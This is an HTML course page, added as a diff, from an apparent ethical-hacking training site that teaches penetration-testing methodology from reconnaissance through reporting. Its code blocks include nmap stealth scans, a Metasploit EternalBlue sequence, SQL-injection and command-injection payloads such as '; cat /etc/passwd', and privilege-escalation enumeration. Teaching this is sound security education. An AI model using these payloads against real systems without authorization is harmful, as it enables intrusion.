@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Penetration Testing Methodology - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../index.html">Home</a>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown">
+                            Courses
+                        </a>
+                        <ul class="dropdown-menu">
+                            <li><a class="dropdown-item" href="courses.html">All Courses</a></li>
+                            <li><a class="dropdown-item" href="getting-started.html">Getting Started</a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="courses.html#networking">Networking</a></li>
+                            <li><a class="dropdown-item" href="courses.html#python">Python Security</a></li>
+                            <li><a class="dropdown-item" href="courses.html#kali-tools">Kali Tools</a></li>
+                            <li><a class="dropdown-item" href="courses.html#web-security">Web Security</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container-fluid mt-5 pt-4">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h5 class="mb-0"><i class="fas fa-list"></i> Course Navigation</h5>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="list-group list-group-flush">
+                            <a href="#introduction" class="list-group-item list-group-item-action">Introduction</a>
+                            <a href="#methodology" class="list-group-item list-group-item-action">PTES Methodology</a>
+                            <a href="#reconnaissance" class="list-group-item list-group-item-action">Reconnaissance</a>
+                            <a href="#scanning" class="list-group-item list-group-item-action">Scanning & Enumeration</a>
+                            <a href="#exploitation" class="list-group-item list-group-item-action">Exploitation</a>
+                            <a href="#post-exploitation" class="list-group-item list-group-item-action">Post-Exploitation</a>
+                            <a href="#reporting" class="list-group-item list-group-item-action">Reporting</a>
+                            <a href="#virtual-lab" class="list-group-item list-group-item-action">Virtual Lab</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-user-ninja"></i> Advanced Penetration Testing Methodology</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction">
+                            <h2 class="text-success">Introduction to Penetration Testing</h2>
+                            <p>Penetration testing is a simulated cyber attack against your computer system to check for exploitable vulnerabilities. It's a critical component of a comprehensive security program.</p>
+                            
+                            <div class="alert alert-info mt-4">
+                                <h4 class="text-primary"><i class="fas fa-lightbulb"></i> Core Theory</h4>
+                                <p>Think of penetration testing as a "friendly burglar" scenario. Just as you might hire someone to test your home security by attempting to break in, penetration testing involves authorized professionals attempting to breach your digital defenses to identify weaknesses before real attackers do.</p>
+                            </div>
+
+                            <h3 class="text-success mt-4">Types of Penetration Testing</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">By Knowledge Level</h4>
+                                    <ul>
+                                        <li><strong>Black Box:</strong> No prior knowledge of the system</li>
+                                        <li><strong>White Box:</strong> Full knowledge of the system</li>
+                                        <li><strong>Gray Box:</strong> Limited knowledge of the system</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">By Target Type</h4>
+                                    <ul>
+                                        <li><strong>Network Penetration Testing</strong></li>
+                                        <li><strong>Web Application Testing</strong></li>
+                                        <li><strong>Mobile Application Testing</strong></li>
+                                        <li><strong>Social Engineering Testing</strong></li>
+                                        <li><strong>Physical Security Testing</strong></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- PTES Methodology Section -->
+                        <section id="methodology" class="mb-5">
+                            <h2 class="text-success">PTES (Penetration Testing Execution Standard)</h2>
+                            <p>PTES provides a comprehensive methodology for conducting penetration tests, ensuring consistency and thoroughness.</p>
+                            
+                            <div class="card bg-dark text-white mt-3">
+                                <div class="card-header">
+                                    <h5><i class="fas fa-cogs"></i> PTES Phases</h5>
+                                </div>
+                                <div class="card-body">
+                                    <ol>
+                                        <li><strong>Pre-engagement Interactions:</strong> Scope definition and legal agreements</li>
+                                        <li><strong>Intelligence Gathering:</strong> Information collection about the target</li>
+                                        <li><strong>Threat Modeling:</strong> Identifying potential attack vectors</li>
+                                        <li><strong>Vulnerability Analysis:</strong> Finding security weaknesses</li>
+                                        <li><strong>Exploitation:</strong> Attempting to exploit vulnerabilities</li>
+                                        <li><strong>Post Exploitation:</strong> Maintaining access and gathering intelligence</li>
+                                        <li><strong>Reporting:</strong> Documenting findings and recommendations</li>
+                                    </ol>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Reconnaissance Section -->
+                        <section id="reconnaissance" class="mb-5">
+                            <h2 class="text-success">Reconnaissance Phase</h2>
+                            <p>The reconnaissance phase involves gathering as much information as possible about the target without directly interacting with their systems.</p>
+                            
+                            <h3 class="text-success mt-4">Passive Reconnaissance</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">OSINT Sources</h4>
+                                    <ul>
+                                        <li><strong>Search Engines:</strong> Google dorking, Bing, DuckDuckGo</li>
+                                        <li><strong>Social Media:</strong> LinkedIn, Facebook, Twitter</li>
+                                        <li><strong>Public Records:</strong> WHOIS, DNS records</li>
+                                        <li><strong>Job Postings:</strong> Technology stack information</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Tools & Techniques</h4>
+                                    <ul>
+                                        <li><strong>theHarvester:</strong> Email and subdomain enumeration</li>
+                                        <li><strong>Maltego:</strong> Link analysis and data mining</li>
+                                        <li><strong>Shodan:</strong> Internet-connected device search</li>
+                                        <li><strong>Recon-ng:</strong> Web reconnaissance framework</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="code-block mt-4">
+# Example: Using theHarvester for email enumeration
+theharvester -d target.com -l 500 -b google
+
+# Example: Google dorking for sensitive files
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"index of"
+                            </div>
+                        </section>
+
+                        <!-- Scanning Section -->
+                        <section id="scanning" class="mb-5">
+                            <h2 class="text-success">Scanning & Enumeration</h2>
+                            <p>Active reconnaissance involves directly interacting with the target systems to gather detailed information.</p>
+                            
+                            <h3 class="text-success mt-4">Network Scanning</h3>
+                            <div class="code-block">
+# Network discovery
+nmap -sn 192.168.1.0/24
+
+# Port scanning
+nmap -sS -sV -O target.com
+
+# Comprehensive scan
+nmap -A -T4 -p- target.com
+
+# Stealth scan
+nmap -sS -f -D RND:10 target.com
+                            </div>
+
+                            <h3 class="text-success mt-4">Service Enumeration</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Common Services</h4>
+                                    <ul>
+                                        <li><strong>HTTP/HTTPS (80/443):</strong> Web applications</li>
+                                        <li><strong>SSH (22):</strong> Secure shell access</li>
+                                        <li><strong>FTP (21):</strong> File transfer protocol</li>
+                                        <li><strong>SMB (445):</strong> Windows file sharing</li>
+                                        <li><strong>DNS (53):</strong> Domain name resolution</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Enumeration Tools</h4>
+                                    <ul>
+                                        <li><strong>Nmap NSE scripts</strong></li>
+                                        <li><strong>enum4linux:</strong> SMB enumeration</li>
+                                        <li><strong>dirb/gobuster:</strong> Directory bruteforcing</li>
+                                        <li><strong>nikto:</strong> Web vulnerability scanner</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Exploitation Section -->
+                        <section id="exploitation" class="mb-5">
+                            <h2 class="text-success">Exploitation Phase</h2>
+                            <p>The exploitation phase involves attempting to gain unauthorized access to systems by leveraging identified vulnerabilities.</p>
+                            
+                            <div class="alert alert-warning">
+                                <h4 class="text-dark"><i class="fas fa-exclamation-triangle"></i> Ethical Guidelines</h4>
+                                <p>Always ensure you have explicit written authorization before attempting any exploitation. Unauthorized access is illegal and unethical.</p>
+                            </div>
+
+                            <h3 class="text-success mt-4">Common Exploitation Techniques</h3>
+                            <div class="code-block">
+# Metasploit Framework
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target_ip
+set LHOST attacker_ip
+exploit
+
+# Manual exploitation example
+# SQL Injection
+' OR '1'='1' --
+' UNION SELECT 1,2,3,4,5 --
+
+# Command Injection
+; cat /etc/passwd
+| whoami
+                            </div>
+                        </section>
+
+                        <!-- Post-Exploitation Section -->
+                        <section id="post-exploitation" class="mb-5">
+                            <h2 class="text-success">Post-Exploitation</h2>
+                            <p>After gaining initial access, post-exploitation activities focus on maintaining access, escalating privileges, and gathering intelligence.</p>
+                            
+                            <h3 class="text-success mt-4">Key Activities</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Privilege Escalation</h4>
+                                    <ul>
+                                        <li><strong>Linux:</strong> SUID binaries, kernel exploits</li>
+                                        <li><strong>Windows:</strong> Token impersonation, service misconfigurations</li>
+                                        <li><strong>Database:</strong> SQL injection to system commands</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Persistence</h4>
+                                    <ul>
+                                        <li><strong>Backdoors:</strong> Hidden access methods</li>
+                                        <li><strong>Scheduled Tasks:</strong> Automated execution</li>
+                                        <li><strong>Registry Modifications:</strong> Windows persistence</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="code-block mt-4">
+# Linux privilege escalation
+find / -perm -4000 -type f 2>/dev/null
+sudo -l
+cat /etc/crontab
+
+# Windows privilege escalation
+whoami /priv
+net user
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+                            </div>
+                        </section>
+
+                        <!-- Reporting Section -->
+                        <section id="reporting" class="mb-5">
+                            <h2 class="text-success">Reporting & Documentation</h2>
+                            <p>Comprehensive reporting is crucial for communicating findings and providing actionable recommendations.</p>
+                            
+                            <h3 class="text-success mt-4">Report Structure</h3>
+                            <div class="card bg-dark text-white mt-3">
+                                <div class="card-header">
+                                    <h5><i class="fas fa-file-alt"></i> Professional Report Components</h5>
+                                </div>
+                                <div class="card-body">
+                                    <ol>
+                                        <li><strong>Executive Summary:</strong> High-level overview for management</li>
+                                        <li><strong>Methodology:</strong> Testing approach and scope</li>
+                                        <li><strong>Findings Summary:</strong> Vulnerability overview with risk ratings</li>
+                                        <li><strong>Detailed Findings:</strong> Technical details and proof of concept</li>
+                                        <li><strong>Recommendations:</strong> Remediation steps and best practices</li>
+                                        <li><strong>Appendices:</strong> Supporting documentation and evidence</li>
+                                    </ol>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Virtual Lab Section -->
+                        <section id="virtual-lab" class="mb-5">
+                            <h2 class="text-success">Virtual Penetration Testing Lab</h2>
+                            <p>Practice penetration testing commands in our interactive virtual terminal.</p>
+                            
+                            <div class="card border-success">
+                                <div class="card-header bg-dark text-success">
+                                    <h5 class="mb-0"><i class="fas fa-terminal"></i> Virtual Terminal - Penetration Testing Lab</h5>
+                                </div>
+                                <div class="card-body bg-black text-success p-0">
+                                    <div id="terminal-pentest" class="virtual-terminal" style="height: 400px; overflow-y: auto; padding: 15px; font-family: 'Courier New', monospace; font-size: 14px;">
+                                        <div class="terminal-line">
+                                            <span class="text-warning">root@kali</span><span class="text-white">:</span><span class="text-primary">~</span><span class="text-white"># </span><span class="cursor">_</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="card-footer">
+                                    <small class="text-muted">
+                                        Try commands: <code>nmap -sn 192.168.1.0/24</code>, <code>nikto -h target.com</code>, <code>dirb http://target.com</code>
+                                    </small>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="row mt-5">
+                            <div class="col-md-6">
+                                <a href="courses.html" class="btn btn-outline-success">
+                                    <i class="fas fa-arrow-left"></i> Back to Courses
+                                </a>
+                            </div>
+                            <div class="col-md-6 text-end">
+                                <a href="digital-forensics.html" class="btn btn-success">
+                                    Digital Forensics <i class="fas fa-arrow-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. All rights reserved. Professional Ethical Hacking Education.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../js/script.js"></script>
+    <script src="../js/virtual-terminal.js"></script>
+</body>
+</html>
